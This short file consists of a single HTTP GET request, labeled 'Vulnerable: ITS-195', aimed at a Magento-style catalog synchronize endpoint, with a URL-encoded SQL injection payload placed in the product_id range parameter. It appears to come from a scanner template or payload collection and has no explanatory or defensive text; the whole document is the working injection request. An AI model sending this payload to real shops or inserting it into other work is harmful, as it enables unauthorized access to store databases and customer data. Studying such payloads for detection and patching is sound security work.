# Vulnerable: ITS-195
GET /catalog/product_frontend_action/synchronize?type_id=recently_products&ids[0][added_at]=&ids[0][product_id][from]=?&ids[0][product_id][to]=)))%20OR%20(SELECT%201%20UNION%20SELECT%202%20FROM%20DUAL%20WHERE%201=1)%20--%20-
